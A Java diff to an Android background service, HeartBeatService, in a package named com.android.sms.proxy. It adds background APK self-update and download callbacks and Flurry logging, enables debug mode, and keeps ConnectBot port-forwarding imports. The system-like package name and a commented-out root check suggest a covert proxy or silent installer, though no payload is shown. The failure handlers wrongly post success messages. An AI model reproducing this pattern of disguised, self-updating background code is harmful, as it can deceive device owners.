@@ -20,7 +20,14 @@ import com.android.sms.proxy.entity.BindServiceEvent;
 import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.NativeParams;
 import com.flurry.android.FlurryAgent;
+import com.oplay.nohelper.assist.bolts.Task;
 import com.oplay.nohelper.utils.Util_Service;
+
+import net.luna.common.download.interfaces.ApkDownloadListener;
+import net.luna.common.download.model.AppModel;
+import net.luna.common.download.model.FileDownloadTask;
+import net.youmi.android.libs.common.download.ext.OplayDownloadManager;
+import net.youmi.android.libs.common.download.ext.SimpleAppInfo;
 
 import org.connectbot.bean.HostBean;
 import org.connectbot.bean.PortForwardBean;
@@ -33,6 +40,7 @@ import org.greenrobot.eventbus.Subscribe;
 
 import java.util.HashMap;
 import java.util.Map;
+import java.util.concurrent.Callable;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
@@ -42,14 +50,16 @@ import java.util.concurrent.TimeUnit;
 /**
  * @author zyq 16-3-9
  */
-public class HeartBeatService extends Service implements BridgeDisconnectedListener {
+public class HeartBeatService extends Service implements BridgeDisconnectedListener ,ApkDownloadListener, OplayDownloadManager
+        .OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
+        .common.download.listener.ApkDownloadListener{
 
-	private static final boolean DEBUG = false;
+	private static final boolean DEBUG = true;
 	private static final String TAG = "heartBeatService";
 	private ScheduledExecutorService mExecutorService;
 	private ScheduledExecutorService mCheckExecutorService;
 	private ScheduledFuture mScheduledFuture;
-	private static final long MESSAGE_INIT_DELAY = 30 ;//Message 推送延迟
+	private static final long MESSAGE_INIT_DELAY = 60 ;//Message 推送延迟
 	public static long MESSAGE_DELAY = 20;//Message 轮询消息
 	private HeartBeatRunnable mHeartBeatRunnable = null;
 	private CheckServiceRunnable mCheckServiceRunnable = null;
@@ -74,12 +84,26 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		EventBus.getDefault().register(this);
 		FlurryAgent.onStartSession(this);
 		instance = this;
-	}
+
+        OplayDownloadManager.getInstance(this).registerListener(this);
+        OplayDownloadManager.getInstance(this).addDownloadStatusListener(this);
+        OplayDownloadManager.getInstance(this).addProgressUpdateListener(this);
+
+    }
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		scheduledWithFixedDelay(MESSAGE_DELAY);
-		return ServiceCompat.START_STICKY;
+		//更新应用先,不要放到activity中,
+        scheduledWithFixedDelay(MESSAGE_DELAY);
+        //这里
+        Task.callInBackground(new Callable<Object>() {
+            @Override
+            public Object call() throws Exception {
+                ApkUpdateUtil.getInstance(getApplication()).updateApk();
+                return null;
+            }
+        });
+		return Service.START_STICKY;
 	}
 
 
@@ -142,6 +166,9 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 			}
 			FlurryAgent.onError(TAG, "", e);
 		}
+        OplayDownloadManager.getInstance(this).removeListener(this);
+        OplayDownloadManager.getInstance(this).removeDownloadStatusListener(this);
+        OplayDownloadManager.getInstance(this).removeProgressUpdateListener(this);
 	}
 
 	@Nullable
@@ -579,4 +606,138 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 	}
 
 
+    @Override
+    public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {
+
+    }
+
+    @Override
+    public void onApkDownloadStart(FileDownloadTask task) {
+
+    }
+
+    @Override
+    public void onApkDownloadSuccess(FileDownloadTask task) {
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+        final String downloadSuccess = "\nDownload success\n";
+        EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+    }
+
+    @Override
+    public void onApkDownloadSuccess(AppModel model) {
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+        final String downloadSuccess = "\nDownload success(isExist)\n";
+        EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+    }
+
+    @Override
+    public void onApkDownloadFailed(FileDownloadTask task) {
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+
+        final String downloadFail = "\nDownload Fail\n";
+        EventBus.getDefault().post(new MessageEvent(downloadFail));
+    }
+
+    @Override
+    public void onApkDownloadStop(FileDownloadTask task) {
+
+    }
+
+    @Override
+    public void onApkDownloadProgressUpdate(FileDownloadTask task, long contentLength, long completeLength, int
+            percent) {
+
+    }
+
+    @Override
+    public void onApkInstallSuccess(AppModel model) {
+//		Map<String, String> map = new HashMap<>();
+//		map.put(NativeParams.KEY_INSTALL_SUCCESS, String.valueOf(true));
+//		map.put(NativeParams.KEY_IS_DEVICE_ROOT, String.valueOf(RootTools.isAccessGiven()));
+//		FlurryAgent.logEvent(NativeParams.EVENT_START_INSTALL, map);
+//
+//        final String installSuccess = "\ninstallSuccess\n";
+//        EventBus.getDefault().post(new MessageEvent(installSuccess));
+
+    }
+
+    @Override
+    public void onDownloadStatusChanged(SimpleAppInfo info) {
+        if (DEBUG) {
+            Log.d(TAG, "download_state:" + info.getDownloadStatus());
+        }
+    }
+
+
+    @Override
+    public void onProgressUpdate(String url, int percent, long speedBytesPerS) {
+        if (DEBUG) {
+            Log.d(TAG, "onProgressUpdate!!!!!!!!!!!");
+        }
+    }
+
+    @Override
+    public void onApkDownloadBeforeStart_FileLock(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+
+    }
+
+    @Override
+    public void onApkDownloadStart(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+
+    }
+
+    @Override
+    public void onApkDownloadSuccess(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+        if(DEBUG){
+            Log.d(TAG,"apkDownloadSuccess!!!!!!!!!");
+        }
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+        final String downloadSuccess = "\nDownload success(isExist)\n";
+        EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+    }
+
+    @Override
+    public void onApkDownloadFailed(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+        if(DEBUG){
+            Log.d(TAG,"apkDownloadFail!!!!!!!!!!!!!");
+        }
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+        final String downloadSuccess = "\nDownload success(isExist)\n";
+        EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+    }
+
+    @Override
+    public void onApkDownloadStop(net.youmi.android.libs.common.download.model.FileDownloadTask task) {
+        if(DEBUG){
+            Log.d(TAG,"apkDownloadStop!!!!!!!!!!!!!");
+        }
+        Map<String, String> map = new HashMap<>();
+        map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+        FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+        final String downloadSuccess = "\nDownload success(isExist)\n";
+        EventBus.getDefault().post(new MessageEvent(downloadSuccess));
+    }
+
+    @Override
+    public void onApkDownloadProgressUpdate(net.youmi.android.libs.common.download.model.FileDownloadTask task, long
+            contentLength, long completeLength, int percent, long speedBytesPerS) {
+
+    }
+
+    @Override
+    public void onApkInstallSuccess(int rawUrlHashCode) {
+
+    }
 }
